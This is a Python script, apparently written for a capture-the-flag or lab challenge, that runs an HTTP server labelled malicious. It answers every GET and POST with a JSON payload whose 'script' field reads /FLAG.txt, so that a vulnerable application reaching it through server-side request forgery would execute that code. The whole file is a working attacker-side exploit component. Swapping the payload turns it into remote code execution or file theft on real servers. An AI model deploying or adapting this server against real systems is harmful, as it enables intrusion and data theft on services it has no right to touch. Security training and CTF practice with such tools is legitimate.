#!/usr/bin/env python3
"""
Malicious HTTP server for RCE exploitation via SSRF
Serves JSON payload to extract /FLAG.txt content
"""
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import logging
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s'
)

class MaliciousHandler(BaseHTTPRequestHandler):
    """HTTP handler serving malicious JSON payload"""
    
    def log_message(self, format, *args):
        """Override to use logging module"""
        logging.info("%s - %s" % (self.address_string(), format % args))
    
    def do_GET(self):
        """Handle GET requests with malicious JSON payload"""
        logging.info(f"[REQUEST] Method: GET")
        logging.info(f"[REQUEST] Path: {self.path}")
        logging.info(f"[REQUEST] Headers: {dict(self.headers)}")
        logging.info(f"[REQUEST] Client: {self.client_address}")
        
        # Malicious payload to extract /FLAG.txt
        payload = {
            "script": "open('/FLAG.txt').read()"
        }
        
        # Convert to JSON
        json_payload = json.dumps(payload)
        
        # Send response
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(json_payload)))
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        
        # Write JSON payload
        self.wfile.write(json_payload.encode('utf-8'))
        
        logging.info(f"[RESPONSE] Sent payload: {json_payload}")
    
    def do_POST(self):
        """Handle POST requests"""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8') if content_length > 0 else ""
        
        logging.info(f"[REQUEST] Method: POST")
        logging.info(f"[REQUEST] Path: {self.path}")
        logging.info(f"[REQUEST] Headers: {dict(self.headers)}")
        logging.info(f"[REQUEST] Body: {post_data}")
        logging.info(f"[REQUEST] Client: {self.client_address}")
        
        # Same malicious payload
        payload = {
            "script": "open('/FLAG.txt').read()"
        }
        
        json_payload = json.dumps(payload)
        
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Content-Length', str(len(json_payload)))
        self.send_header('Access-Control-Allow-Origin', '*')
        self.end_headers()
        
        self.wfile.write(json_payload.encode('utf-8'))
        
        logging.info(f"[RESPONSE] Sent payload: {json_payload}")

def run_server(host='0.0.0.0', port=8000):
    """Start the malicious HTTP server"""
    server_address = (host, port)
    httpd = HTTPServer(server_address, MaliciousHandler)
    
    logging.info("=" * 80)
    logging.info(f"[STARTING] Malicious RCE HTTP Server")
    logging.info(f"[ADDRESS] Listening on {host}:{port}")
    logging.info(f"[PAYLOAD] {json.dumps({'script': 'open(\"/FLAG.txt\").read()'})}")
    logging.info(f"[STATUS] Server ready to handle SSRF requests")
    logging.info("=" * 80)
    
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        logging.info("\n[STOPPING] Server shutdown requested")
        httpd.shutdown()
        logging.info("[STOPPED] Server stopped")

if __name__ == '__main__':
    run_server()

